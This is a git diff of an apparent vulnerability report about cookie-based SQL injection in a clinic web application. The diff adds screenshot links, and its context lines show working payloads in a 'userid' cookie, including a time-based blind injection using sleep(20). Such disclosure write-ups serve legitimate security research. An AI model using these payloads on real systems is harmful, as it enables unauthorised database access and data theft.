@@ -34,6 +34,8 @@ Connection: close
 
 sql statement error
 
+![image](https://github.com/lcg-22266/bug_pic/blob/main/error.png)
+
 Payload2:Cookie: userid=1234554321''; useremail=test%40clinic.com; login=18-02-2023%2010%3A35%3A34%20AM; user=6; PHPSESSID=8k72voo5t0276k7qbfjgmn7sjm
 
 ```
@@ -57,6 +59,8 @@ Connection: close
 ```
 
 correct page
+
+![image](https://github.com/lcg-22266/bug_pic/blob/main/right.png)
 
 Payload3:Cookie: userid=1234554321'%2b(select*from(select(sleep(20)))a)%2b'; useremail=test%40clinic.com; login=18-02-2023%2010%3A35%3A34%20AM; user=6; PHPSESSID=8k72voo5t0276k7qbfjgmn7sjm
 
@@ -82,4 +86,5 @@ Connection: close
 
 The server response time is 20 seconds
 
+![image](https://github.com/lcg-22266/bug_pic/blob/main/sleep.png)
 
